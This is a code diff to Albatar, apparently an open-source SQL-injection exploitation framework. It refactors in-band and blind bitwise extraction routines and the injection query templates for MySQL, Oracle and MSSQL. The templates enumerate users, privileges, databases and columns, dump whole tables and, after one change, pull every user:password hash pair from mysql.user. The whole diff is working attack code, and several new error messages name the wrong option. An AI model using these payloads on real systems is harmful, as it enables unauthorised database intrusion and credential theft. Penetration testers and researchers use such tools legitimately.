@@ -15,7 +15,7 @@ __author__  = 'Sebastien Macke'
 __email__   = 'lanjelot@gmail.com'
 __url__     = 'https://github.com/lanjelot/albatar'
 __twitter__ = 'https://twitter.com/lanjelot'
-__version__ = 'n/a'
+__version__ = '0.0'
 __license__ = 'GPLv2'
 __banner__  = 'Albatar v%s (%s)' % (__version__, __url__)
 
@@ -37,7 +37,7 @@ logger.setLevel(logging.DEBUG)
 logger.addHandler(fh)
 
 from Queue import Queue, Empty
-from time import sleep, time
+from time import localtime, strftime, sleep, time
 from threading import Thread
 from urlparse import urlparse, urlunparse
 from string import Template
@@ -47,6 +47,8 @@ missing = []
 try:
   import requests
   from requests.auth import HTTPBasicAuth
+  from requests.packages.urllib3.exceptions import InsecureRequestWarning
+  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 except ImportError:
   missing.append('requests')
 
@@ -85,13 +87,12 @@ class Requester_HTTP_Base(object):
     auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x):
 
     self.response_processor = response_processor
-    self.http_opts = url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert
+    self.http_opts = [url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert]
     self.encode_payload = encode_payload
 
   def review_response(self, payload, status_code, header_data, response_data, response_time, content_length):
-
     stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
-    logger.debug('%s %s' % (stats, payload))
+    logger.debug("%s '%s'" % (stats, payload))
 
     return self.response_processor(header_data, response_data, response_time)
 
@@ -115,7 +116,6 @@ class Requester_HTTP_requests(Requester_HTTP_Base):
     self.session.verify = False
 
   def test(self, payload):
-
     url, method, body, headers, _, _, _, _ = self.http_opts
 
     url, body, headers = substitute_payload(self.encode_payload(payload), url, body, '\r\n'.join(headers))
@@ -174,7 +174,6 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     self.fp = fp
 
   def test(self, payload):
-
     url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = self.http_opts
 
     def debug_func(t, s):
@@ -223,8 +222,8 @@ Requester_HTTP = Requester_HTTP_requests
 
 # Method {{{
 def make_payload(template, *args):
-
   payload = template
+
   for k, v in args:
     kw = {k: v}
     payload = T(payload, **kw)
@@ -237,7 +236,7 @@ class Method_Base(object):
     self.make_requester = make_requester
     self.template = template
 
-  def prep(self, query, start_offset, stop_offset):
+  def prepare(self, query, start_offset, stop_offset):
     start_index, stop_index = int(start_offset), int(stop_offset)
 
     if isinstance(query, basestring):
@@ -249,9 +248,9 @@ class Method_Base(object):
         count = self.get_row(c)
 
         logger.info('count: %s' % count)
-        stop_index = int(count[0])
+        stop_index = int(count)
 
-    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
+    logger.debug('retrieving %d rows, starting at row %d' % (stop_index - start_index, start_index))
 
     return start_index, stop_index, q
 
@@ -259,18 +258,16 @@ class Method_Inband(Method_Base):
 
   def __init__(self, make_requester, template, pager=1):
     super(Method_Inband, self).__init__(make_requester, template)
-
     self.pager = pager
 
   def execute(self, query, start_offset, stop_offset):
-
-    start_index, stop_index, q = self.prep(query, start_offset, stop_offset)
+    start_index, stop_index, q = self.prepare(query, start_offset, stop_offset)
 
     for row_index in range(start_index, stop_index, self.pager):
       for r in self.get_row(q, row_index, self.pager):
         yield r
 
-  def get_row(self, query, row_pos=0, pager=10):
+  def get_row(self, query, row_pos=0, pager=1):
     requester = self.make_requester()
 
     payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('row_count', pager))
@@ -291,7 +288,6 @@ class Method_Blind(Method_Base):
     self.confirm_char = confirm_char
 
   def execute(self, query, start_offset, stop_offset):
-
     self.taskq = Queue()
     self.resultq = Queue()
 
@@ -300,7 +296,7 @@ class Method_Blind(Method_Base):
       t.daemon = True
       t.start()
 
-    start_index, stop_index, q = self.prep(query, start_offset, stop_offset)
+    start_index, stop_index, q = self.prepare(query, start_offset, stop_offset)
       
     for row_index in range(start_index, stop_index):
       yield self.get_row(q, row_index)
@@ -317,14 +313,13 @@ class Method_bitwise(Method_Blind):
   def get_state(self):
     while True:
       try:
-        tid, state = self.resultq.get(False, 1)
+        tid, state = self.resultq.get_nowait()
         break
       except Empty:
-        pass
+        sleep(.1)
     return tid, state
 
   def get_row(self, query, row_pos=0):
-
     logger.debug('query: %s' % query)
 
     result = ''
@@ -341,13 +336,10 @@ class Method_bitwise(Method_Blind):
         bit_pos, state = self.get_state()
         char |= state << bit_pos
 
-      logger.debug('char: %d (%s)' % (char, repr(chr(char))))
+      logger.debug('char: %d (%r)' % (char, chr(char)))
 
       if char >= 127:
         continue
-
-      if char == 0:
-        break
 
       if self.confirm_char:
         payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('bit_mask', char), ('row_pos', row_pos))
@@ -358,6 +350,9 @@ class Method_bitwise(Method_Blind):
           requester = self.make_requester()
           logger.debug('could not confirm char')
           continue
+
+      if char == 0:
+        break
 
       sys.stdout.write('%s' % chr(char))
       sys.stdout.flush()
@@ -372,7 +367,6 @@ class Method_bitwise(Method_Blind):
     return result
 
   def consume(self):
-
     requester = self.make_requester()
 
     while True:
@@ -404,7 +398,6 @@ class SQLi_Base:
     self.method = method
 
   def exploit(self):
-
     from sys import argv
     from optparse import OptionParser, OptionGroup
 
@@ -494,6 +487,7 @@ class SQLi_Base:
       queries.append(opts.query)
 
     with Timing() as timing:
+      logger.info('Starting %s at %s' % (__banner__, strftime('%Y-%m-%d %H:%M %Z', localtime())))
       try:
         for query in queries:
           logger.info('Executing: %s' % repr(query))
@@ -574,6 +568,9 @@ class MySQL_Inband(SQLi_Base):
     return c, q
 
   def dump_table(self, db, table, cols):
+    if not (db and table and cols):
+      raise NotImplementedError('-D, -T and -U required')
+
     c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
     q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols), db, table)
     return c, q
@@ -595,8 +592,11 @@ class MySQL_Blind(SQLi_Base):
     return 'SELECT @@HOSTNAME'
 
   def enum_privileges(self, user):
-    c = 'SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s"' % user
-    q = 'SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s" LIMIT ${row_pos},1' % user
+    if not user:
+      raise NotImplementedError('-U required')
+
+    c = 'SELECT COUNT(DISTINCT(privilege_type)) FROM information_schema.user_privileges WHERE grantee="%s"' % user
+    q = 'SELECT DISTINCT(privilege_type) FROM information_schema.user_privileges WHERE grantee="%s" LIMIT ${row_pos},1' % user
     return c, q
 
   def enum_users(self):
@@ -606,10 +606,11 @@ class MySQL_Blind(SQLi_Base):
 
   def enum_passwords(self, user):
     if not user:
-      raise NotImplementedError('-U required')
-
-    c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
-    q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
+      c = 'SELECT COUNT(DISTINCT(CONCAT_WS(0x3a,user,password))) FROM mysql.user'
+      q = 'SELECT DISTINCT(CONCAT_WS(0x3a,user,password)) FROM mysql.user LIMIT ${row_pos},1'
+    else:
+      c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
+      q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
     return c, q
 
   def enum_dbs(self):
@@ -642,6 +643,9 @@ class MySQL_Blind(SQLi_Base):
     return c, q
 
   def dump_table(self, db, table, cols):
+    if not (db and table and cols):
+      raise NotImplementedError('-D, -T and -U required')
+
     c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
     q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols), db, table)
     return c, q
@@ -669,7 +673,7 @@ class Oracle_Inband(SQLi_Base):
       c = "(SELECT UPPER(COUNT(*)) FROM USER_SYS_PRIVS)"
       q = "(SELECT PRIVILEGE X,ROWNUM R FROM USER_SYS_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
 
-      return c, q
+    return c, q
 
   def enum_roles(self, user):
     if user:
@@ -722,10 +726,8 @@ class Oracle_Inband(SQLi_Base):
     return c, q
 
   def dump_table(self, db, table, cols):
-    if not table:
-      raise NotImplementedError('-T required')
-    if not cols:
-      raise NotImplementedError('-C required')
+    if not (table and cols):
+      raise NotImplementedError('-T and -C required')
 
     if db:
       c = '(SELECT UPPER(COUNT(*)) X FROM %s.%s)' % (db, table)
@@ -795,22 +797,16 @@ class Oracle_Blind(SQLi_Base):
     return c, q
 
   def enum_columns(self, db, table):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
+    if not (db and table):
+      raise NotImplementedError('-D and -T required')
 
     c = "SELECT COUNT(*) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table.upper(), db.upper())
     q = "SELECT X FROM (SELECT COLUMN_NAME X,ROWNUM-1 R FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE R=${row_pos}" % (table.upper(), db.upper())
     return c, q
 
   def dump_table(self, db, table, cols):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
-    if not cols:
-      raise NotImplementedError('-C required')
+    if not (db and table and cols):
+      raise NotImplementedError('-D, -T and -U required')
 
     c = "SELECT COUNT(*) FROM %s" % table.upper()
     q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols), table.upper())
@@ -861,10 +857,8 @@ class MSSQL_Inband(SQLi_Base):
     return c, q
 
   def enum_columns(self, db, table):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
+    if not (db and table):
+      raise NotImplementedError('-D and -T required')
 
     c = T("(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}')a", db=db, table=table)
     q = T("(SELECT TOP ${row_count} x.name X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'" \
@@ -872,12 +866,8 @@ class MSSQL_Inband(SQLi_Base):
     return c, q
 
   def dump_table(self, db, table, cols):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
-    if not cols:
-      raise NotImplementedError('-C required')
+    if not (db and table and cols):
+      raise NotImplementedError('-D, -T and -U required')
 
     c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..${table})a', db=db, table=table)
     q = T('(SELECT TOP ${row_count} ${cols} X FROM ${db}..${table} WHERE ${cols}' \
@@ -932,10 +922,8 @@ class MSSQL_Blind(SQLi_Base):
     return c, q
 
   def enum_columns(self, db, table):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
+    if not (db and table):
+      raise NotImplementedError('-D and -T required')
 
     c = T("SELECT LTRIM(STR(COUNT(x.name))) FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'", db=db, table=table)
     q = T("SELECT TOP 1 x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' AND x.name" \
@@ -943,12 +931,8 @@ class MSSQL_Blind(SQLi_Base):
     return c, q
 
   def dump_table(self, db, table, cols):
-    if not db:
-      raise NotImplementedError('-D required')
-    if not table:
-      raise NotImplementedError('-T required')
-    if not cols:
-      raise NotImplementedError('-C required')
+    if not (db and table and cols):
+      raise NotImplementedError('-D, -T and -C required')
 
     c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
     q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
